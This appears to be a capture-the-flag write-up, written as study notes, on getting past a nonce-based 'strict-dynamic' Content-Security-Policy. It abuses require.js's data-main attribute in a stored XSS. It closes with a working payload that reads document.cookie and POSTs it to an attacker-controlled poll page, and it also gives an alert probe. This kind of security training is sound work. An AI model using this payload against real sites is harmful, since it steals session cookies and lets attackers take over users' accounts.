The first part is the same of the previous challenge:
	First of all, try all the inputs: <script>alert(1)</script> to see which input section is vulnerable (quick way)
	you need to change the number for each inputs (in alert)
	Notice that in the first page, they are interpreted as text so no xss here.
	In the second page (pool something), a comment is not printed. If it is not printed, probably it's code. Inspect the element to be sure
	If you don't know if the challenge is csp: usually, if you need to steal the cookies, it's xss
	In this challenge there is a bot that will open the page that you sent. If there are scripts, they will be executed(xss included)
	The trick is to make the bot goes there and we will check with a proxy all the get requests and in one of them there will be the flag
	Content-Security-Policy allows you to use javascript only if it comes from the specified links
	you can check it with inspect element -> network -> f5 -> header(intestazione)
	there you will find the Content-Security-Policy and 
	(notice that CSP blocks the previous alert, that's why you cannot use directly xss)
The difference with the previous one is the Content-Security-Policy which is (for the script):
	script-src 'strict-dynamic' 'nonce-e9T1XZ3iyo'
here, you can find an explanation of nonce:
	https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/nonce

the idea is to exploit the only avaiable javascript in the page: require.js. 
Again we can use the same vulnerability which stored-based on the page pool.
We want to send a post request to another page (we have two equal pages of the challenges opened) and retrieve the flag on body of the comment.
Notice that Formdata is specified in the html as the "post" request. Same thing also for the field "name" and "comment".
The link in the script is the link of the receiving page.
While the link of the sending page is copy-pasted in the checker (web-site with a bot). 
	<script data-main='data:1,var form = new FormData(); form.append("name","flag"); form.append("comment",document.cookie);fetch("https://strict-csp.training.jinblack.it/poll/2cee89a5a5d14966af351381d78d4edb",{method:"POST",body: form});' src='require.js'></script>
